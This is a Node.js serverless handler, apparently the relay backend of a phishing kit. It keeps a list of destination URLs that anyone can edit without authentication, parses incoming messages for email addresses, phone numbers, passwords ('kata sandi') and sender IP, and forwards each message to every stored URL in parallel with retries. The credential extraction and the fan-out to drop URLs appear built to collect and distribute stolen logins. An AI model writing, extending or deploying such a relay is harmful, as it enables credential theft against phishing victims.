const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

// ======================
// SAFE INIT FILE
// ======================
function ensureFile() {
  try {
    const dir = path.dirname(FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, "[]");
  } catch {}
}

// ======================
// LOAD URLS
// ======================
function loadUrls() {
  ensureFile();
  try {
    return JSON.parse(fs.readFileSync(FILE, "utf8"));
  } catch {
    return [];
  }
}

// ======================
// SAVE URLS
// ======================
function saveUrls(data) {
  ensureFile();
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

// ======================
// PARSE BODY (JSON + FORM)
// ======================
function parseBody(req) {
  if (!req.body) return {};

  if (typeof req.body === "string") {
    return Object.fromEntries(new URLSearchParams(req.body));
  }

  return req.body;
}

// ======================
// STRIP HTML
// ======================
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]*>/g, "\n");
}

// ======================
// AUTO DETECT VARIABLES (FULL POWER)
// ======================
function extractVars(input = "") {
  const text = stripHtml(input);
  const vars = {};

  let m;

  // PHP style: $email = value
  const phpRegex = /\$([a-zA-Z0-9_]+)\s*=\s*([^<\n]+)/g;
  while ((m = phpRegex.exec(text))) {
    vars[m[1].toLowerCase()] = m[2].trim();
  }

  // key:value / key=value
  const kvRegex = /([a-zA-Z0-9_]{2,})\s*[:=]\s*([^<\n]+)/g;
  while ((m = kvRegex.exec(text))) {
    const k = m[1].toLowerCase();
    const v = m[2].trim();
    if (v.length < 500) vars[k] = v;
  }

  // EMAIL AUTO DETECT
  const email = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/i);
  if (email) vars.email = email[0];

  // PHONE AUTO DETECT
  const phone = text.match(/(\+?\d{8,15})/);
  if (phone) vars.phone = phone[1];

  // PASSWORD DETECT
  const pass =
    text.match(/(?:password|kata\s*sandi|pass)\s*[:=]\s*([^\n<]+)/i);
  if (pass) vars.password = pass[1].trim();

  // LOGIN FALLBACK
  if (!vars.user && vars.login) vars.user = vars.login;

  return vars;
}

// ======================
// SIMPLE RATE LIMIT (ANTI SPAM)
// ======================
const spamMap = {};
function isSpam(ip) {
  const now = Date.now();
  if (!spamMap[ip]) spamMap[ip] = [];

  spamMap[ip] = spamMap[ip].filter(t => now - t < 5000);

  if (spamMap[ip].length >= 5) return true;

  spamMap[ip].push(now);
  return false;
}

// ======================
// FETCH WITH RETRY
// ======================
async function fetchWithRetry(url, payload, retries = 2) {
  const fetchFn = global.fetch || require("node-fetch");

  for (let i = 0; i <= retries; i++) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);

    try {
      const res = await fetchFn(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: payload,
        signal: controller.signal
      });

      clearTimeout(timeout);

      return {
        url,
        status: res.status,
        success: res.ok,
        retry: i
      };
    } catch (err) {
      clearTimeout(timeout);

      if (i === retries) {
        return {
          url,
          success: false,
          error: err.name === "AbortError" ? "TIMEOUT" : err.message
        };
      }
    }
  }
}

// ======================
// MAIN HANDLER
// ======================
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = parseBody(req);
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    // ANTI SPAM CHECK
    if (isSpam(ip)) {
      return res.status(429).json({
        success: false,
        message: "Too many requests (spam detected)"
      });
    }

    let urls = loadUrls();
    const action = body.action || "send";

    // ======================
    // ADD URL
    // ======================
    if (action === "add-url") {
      if (!body.url) return res.json({ success: false });

      if (!urls.includes(body.url)) {
        urls.push(body.url);
        saveUrls(urls);
      }

      return res.json({ success: true, urls });
    }

    // ======================
    // DELETE URL
    // ======================
    if (action === "delete-url") {
      urls = urls.filter(x => x !== body.url);
      saveUrls(urls);
      return res.json({ success: true, urls });
    }

    // ======================
    // LIST URL
    // ======================
    if (action === "list-url") {
      return res.json({ success: true, urls });
    }

    // ======================
    // SEND MODE
    // ======================
    const subjek = body.subjek || "System";
    const messageRaw = body.message || body.pesan || "";

    if (!messageRaw) {
      return res.status(400).json({
        success: false,
        message: "message required"
      });
    }

    const vars = extractVars(messageRaw);
    vars.ip = vars.ip || ip;

    const payload = new URLSearchParams({
      subjek,
      pesan: messageRaw,
      sender: "system"
    }).toString();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    // ======================
    // PARALLEL REQUEST (FAST)
    // ======================
    const results = await Promise.all(
      urls.map(url => fetchWithRetry(url, payload))
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      vars,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
};
